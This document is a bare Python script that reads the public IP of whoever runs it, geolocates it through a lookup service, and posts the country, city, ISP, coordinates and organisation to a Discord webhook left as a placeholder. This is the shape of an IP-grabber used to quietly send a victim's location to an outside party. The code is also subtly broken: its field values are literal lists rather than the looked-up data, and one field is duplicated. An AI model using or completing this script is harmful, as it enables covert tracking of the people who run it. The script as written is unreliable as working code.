#pip install requests
#pip install dhooks
#pip install datetime

import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("webhook here")

time = datetime.now().strftime("%H:%M %p")  
ip = requests.get("https://api.ipify.org/").text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': ['query']},
    {'name': 'ipType', 'value': ['ipType']},
    {'name': 'Country', 'value': ['country']},
    {'name': 'City', 'value': ['city']},
    {'name': 'Continent', 'value': ['continent']},
    {'name': 'Country', 'value': ['country']},
    {'name': 'IPName', 'value': ['ipName']},
    {'name': 'ISP', 'value': ['isp']},
    {'name': 'Latitute', 'value': ['lat']},
    {'name': 'Longitude', 'value': ['lon']},
    {'name': 'Org', 'value': ['org']},
    {'name': 'Region', 'value': ['region']},
    {'name': 'Status', 'value': ['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)
